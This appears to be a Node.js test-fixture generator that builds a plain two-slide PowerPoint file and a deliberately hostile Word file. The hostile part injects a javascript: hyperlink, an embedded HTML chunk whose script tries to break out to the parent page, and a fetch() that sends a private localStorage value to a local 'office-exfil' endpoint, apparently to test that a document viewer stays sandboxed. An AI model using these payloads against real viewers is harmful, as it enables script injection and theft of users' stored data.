import JSZip from "jszip";
import { readFileSync, writeFileSync } from "node:fs";
const zip = new JSZip();
const p = "http://schemas.openxmlformats.org/presentationml/2006/main",
  a = "http://schemas.openxmlformats.org/drawingml/2006/main",
  r = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
const rels = (items) =>
  `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${items.map(([id, type, target]) => `<Relationship Id="${id}" Type="${r}/${type}" Target="${target}"/>`).join("")}</Relationships>`;
zip.file(
  "_rels/.rels",
  rels([["rId1", "officeDocument", "ppt/presentation.xml"]]),
);
zip.file(
  "[Content_Types].xml",
  `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension="png" ContentType="image/png"/><Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/><Override PartName="/ppt/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/><Override PartName="/ppt/slideMasters/slideMaster1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml"/><Override PartName="/ppt/slideLayouts/slideLayout1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>${[1, 2].map((i) => `<Override PartName="/ppt/slides/slide${i}.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>`).join("")}</Types>`,
);
zip.file(
  "ppt/presentation.xml",
  `<p:presentation xmlns:p="${p}" xmlns:a="${a}" xmlns:r="${r}"><p:sldMasterIdLst><p:sldMasterId id="2147483648" r:id="master"/></p:sldMasterIdLst><p:sldIdLst><p:sldId id="256" r:id="s1"/><p:sldId id="257" r:id="s2"/></p:sldIdLst><p:sldSz cx="9144000" cy="5143500"/><p:notesSz cx="6858000" cy="9144000"/></p:presentation>`,
);
zip.file(
  "ppt/_rels/presentation.xml.rels",
  rels([
    ["s1", "slide", "slides/slide1.xml"],
    ["s2", "slide", "slides/slide2.xml"],
    ["master", "slideMaster", "slideMasters/slideMaster1.xml"],
    ["theme", "theme", "theme/theme1.xml"],
  ]),
);
const tree = `<p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/><a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr>`;
zip.file(
  "ppt/slideMasters/slideMaster1.xml",
  `<p:sldMaster xmlns:p="${p}" xmlns:a="${a}" xmlns:r="${r}"><p:cSld><p:spTree>${tree}</p:spTree></p:cSld><p:clrMap accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" bg1="lt1" bg2="lt2" tx1="dk1" tx2="dk2" hlink="hlink" folHlink="folHlink"/><p:sldLayoutIdLst><p:sldLayoutId id="1" r:id="layout"/></p:sldLayoutIdLst><p:txStyles><p:titleStyle/><p:bodyStyle/><p:otherStyle/></p:txStyles></p:sldMaster>`,
);
zip.file(
  "ppt/slideMasters/_rels/slideMaster1.xml.rels",
  rels([
    ["theme", "theme", "../theme/theme1.xml"],
    ["layout", "slideLayout", "../slideLayouts/slideLayout1.xml"],
  ]),
);
zip.file(
  "ppt/slideLayouts/slideLayout1.xml",
  `<p:sldLayout xmlns:p="${p}" xmlns:a="${a}" xmlns:r="${r}" type="blank"><p:cSld><p:spTree>${tree}</p:spTree></p:cSld><p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr></p:sldLayout>`,
);
zip.file(
  "ppt/slideLayouts/_rels/slideLayout1.xml.rels",
  rels([["master", "slideMaster", "../slideMasters/slideMaster1.xml"]]),
);
zip.file(
  "ppt/theme/theme1.xml",
  `<a:theme xmlns:a="${a}" name="Reading"><a:themeElements><a:clrScheme name="Reading">${["dk1", "lt1", "dk2", "lt2", "accent1", "accent2", "accent3", "accent4", "accent5", "accent6", "hlink", "folHlink"].map((n) => `<a:${n}><a:sysClr val="windowText" lastClr="000000"/></a:${n}>`).join("")}</a:clrScheme><a:fontScheme name="Reading"><a:majorFont><a:latin typeface="Atkinson Hyperlegible Next"/></a:majorFont><a:minorFont><a:latin typeface="Atkinson Hyperlegible Next"/></a:minorFont></a:fontScheme><a:fmtScheme name="Reading"><a:fillStyleLst/><a:lnStyleLst/><a:effectStyleLst/><a:bgFillStyleLst/></a:fmtScheme></a:themeElements></a:theme>`,
);
const image = await JSZip.loadAsync(
  readFileSync("fixtures/office-reading.docx"),
);
zip.file(
  "ppt/media/image1.png",
  await image.file("word/media/diagram.png").async("uint8array"),
);
for (const i of [1, 2]) {
  zip.file(
    `ppt/slides/_rels/slide${i}.xml.rels`,
    rels([
      ["layout", "slideLayout", "../slideLayouts/slideLayout1.xml"],
      ["image", "image", "../media/image1.png"],
    ]),
  );
  zip.file(
    `ppt/slides/slide${i}.xml`,
    `<p:sld xmlns:p="${p}" xmlns:a="${a}" xmlns:r="${r}"><p:cSld><p:spTree>${tree}<p:sp><p:nvSpPr><p:cNvPr id="2" name="Reading title"/><p:cNvSpPr txBox="1"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x="457200" y="457200"/><a:ext cx="8229600" cy="914400"/></a:xfrm><a:prstGeom prst="rect"><a:avLst/></a:prstGeom></p:spPr><p:txBody><a:bodyPr/><a:lstStyle/><a:p><a:r><a:rPr lang="en-US" sz="3200"/><a:t>Reading slide ${i}</a:t></a:r><a:endParaRPr/></a:p></p:txBody></p:sp><p:pic><p:nvPicPr><p:cNvPr id="3" name="Reading diagram"/><p:cNvPicPr/><p:nvPr/></p:nvPicPr><p:blipFill><a:blip r:embed="image"/><a:stretch><a:fillRect/></a:stretch></p:blipFill><p:spPr><a:xfrm><a:off x="457200" y="1828800"/><a:ext cx="914400" cy="914400"/></a:xfrm><a:prstGeom prst="rect"><a:avLst/></a:prstGeom></p:spPr></p:pic></p:spTree></p:cSld><p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr></p:sld>`,
  );
}
writeFileSync(
  "fixtures/office-reading.pptx",
  await zip.generateAsync({ type: "nodebuffer" }),
);
const hostile = await JSZip.loadAsync(
  readFileSync("fixtures/office-reading.docx"),
);
let doc = await hostile.file("word/document.xml").async("string");
doc = doc.replace(
  "<w:sectPr>",
  '<w:p><w:hyperlink r:id="attack"><w:r><w:t>Hostile parent probe</w:t></w:r></w:hyperlink></w:p><w:altChunk r:id="chunk"/><w:sectPr>',
);
hostile.file("word/document.xml", doc);
let rel = await hostile.file("word/_rels/document.xml.rels").async("string");
rel = rel.replace(
  "</Relationships>",
  `<Relationship Id="attack" Type="${r}/hyperlink" Target="javascript:parent.document.body.dataset.officeEscaped=1" TargetMode="External"/><Relationship Id="chunk" Type="${r}/aFChunk" Target="attack.html"/></Relationships>`,
);
hostile.file("word/_rels/document.xml.rels", rel);
hostile.file(
  "word/attack.html",
  '<script>parent.document.body.dataset.officeEscaped=1;fetch("http://127.0.0.1:4173/office-exfil?storage="+parent.localStorage.getItem("shelf-private"))</script>',
);
writeFileSync(
  "fixtures/office-hostile.docx",
  await hostile.generateAsync({ type: "nodebuffer" }),
);
